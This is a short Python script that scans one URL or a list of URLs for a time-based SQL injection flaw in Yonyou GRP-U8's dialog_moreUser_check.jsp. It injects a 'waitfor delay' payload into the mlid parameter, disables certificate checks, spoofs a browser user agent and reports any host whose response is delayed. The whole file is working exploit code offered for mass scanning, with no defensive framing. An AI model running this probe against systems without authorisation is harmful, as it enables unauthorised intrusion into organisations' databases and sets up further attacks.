import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/u8qx/dialog_moreUser_check.jsp?mlid=';waitfor+delay+'0:0:5'--")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    try:
        response = requests.get(target, verify=False, headers=headers, timeout=15)
        response_time = response.elapsed.total_seconds()
        if response.status_code == 200 and 5 < response_time < 10:
                print(f"\033[31mDiscovered:{url}: YongyouGRP-U8_dialog_moreUser_check_SQLInject!\033[0m")
                return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")